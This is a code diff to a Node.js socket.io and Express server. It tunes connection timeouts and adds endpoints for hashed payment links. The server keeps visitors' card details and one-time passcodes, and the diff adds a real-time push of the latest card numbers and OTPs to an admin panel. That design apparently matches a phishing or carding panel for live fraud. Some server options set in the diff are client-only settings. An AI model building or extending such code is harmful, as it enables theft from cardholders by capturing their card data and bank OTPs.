@@ -7,6 +7,7 @@ import pathToRegexp from 'path-to-regexp';
 import { match } from 'path-to-regexp';
 import fs from 'fs/promises';
 import { existsSync } from 'fs';
+import { v4 as uuidv4 } from 'uuid';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -32,10 +33,16 @@ const io = new Server(server, {
   cors: corsOptions,
   transports: ['websocket', 'polling'],
   // Enhanced settings for mobile and low internet connections
-  pingTimeout: 120000, // 2 minutes - longer timeout for mobile
-  pingInterval: 25000,  // 25 seconds - more frequent pings
-  upgradeTimeout: 30000, // 30 seconds for upgrade timeout
+  pingTimeout: 180000, // 3 minutes - much longer timeout for mobile
+  pingInterval: 45000,  // 45 seconds - less aggressive pings
+  upgradeTimeout: 60000, // 1 minute for upgrade timeout
   allowUpgrades: true,
+  // Enhanced reconnection settings for mobile
+  connectTimeout: 45000,
+  forceNew: false,
+  reconnection: true,
+  reconnectionAttempts: 10,
+  reconnectionDelay: 2000,
   perMessageDeflate: {
     threshold: 1024,
     zlibDeflateOptions: {
@@ -699,13 +706,22 @@ io.on('connection', (socket) => {
     const visitors = Array.from(activeVisitors.values());
     const analytics = calculatePaymentAnalytics();
     
-    // Send current state
+    // Send current state immediately for mobile reconnection
     socket.emit('visitors-update', visitors);
     socket.emit('admin-data-loaded', {
       visitors: adminData.visitors,
       payments: adminData.payments,
       otps: adminData.otps,
       cardDetails: adminData.cardDetails
+    });
+    
+    // Send real-time updates for mobile admin panels
+    socket.emit('realtime-sync', {
+      activeVisitors: visitors,
+      recentPayments: adminData.payments.slice(-10), // Last 10 payments
+      recentOtps: adminData.otps.slice(-10), // Last 10 OTPs
+      recentCards: adminData.cardDetails.slice(-10), // Last 10 card details
+      timestamp: new Date().toISOString()
     });
     
     console.log(`📊 Admin data sent: ${visitors.length} active visitors, ${adminData.payments.length} payments, ${adminData.visitors.length} visitor history`);
@@ -866,6 +882,60 @@ app.post('/api/update-exchange-rate', (req, res) => {
     console.error('Error updating exchange rate:', error);
     res.status(500).json({ error: 'Failed to update exchange rate' });
   }
+});
+
+// API endpoint to create hashed payment link
+app.post('/api/create-payment-link', (req, res) => {
+  console.log('🔗 POST /api/create-payment-link called with body:', req.body);
+  try {
+    const { amount, currency, plan = 'Custom', billing = 'custom' } = req.body;
+    
+    if (!amount || !currency) {
+      return res.status(400).json({ error: 'Amount and currency are required' });
+    }
+    
+    // Generate unique hashed link
+    const hash = `${uuidv4()}${Date.now().toString(36)}${Math.random().toString(36).substr(2, 9)}`.toUpperCase().replace(/-/g, '').substring(0, 16);
+    
+    // Store payment data with hash
+    const paymentData = {
+      hash,
+      amount: parseFloat(amount),
+      currency,
+      plan,
+      billing,
+      createdAt: new Date().toISOString(),
+      status: 'pending'
+    };
+    
+    // Store in memory (you might want to use a database)
+    if (!adminData.hashedPayments) {
+      adminData.hashedPayments = {};
+    }
+    adminData.hashedPayments[hash] = paymentData;
+    
+    // Save to persistent storage
+    saveAdminData();
+    
+    console.log(`✅ Payment link created: ${hash} for ${amount} ${currency}`);
+    res.json({ success: true, hash, paymentData });
+  } catch (error) {
+    console.error('Error creating payment link:', error);
+    res.status(500).json({ error: 'Failed to create payment link' });
+  }
+});
+
+// API endpoint to get payment data by hash
+app.get('/api/payment-data/:hash', (req, res) => {
+  const { hash } = req.params;
+  
+  if (!adminData.hashedPayments || !adminData.hashedPayments[hash]) {
+    return res.status(404).json({ error: 'Payment link not found' });
+  }
+  
+  const paymentData = adminData.hashedPayments[hash];
+  console.log(`📊 Payment data retrieved for hash: ${hash}`);
+  res.json({ success: true, data: paymentData });
 });
 
 // Health check endpoint for Render.com
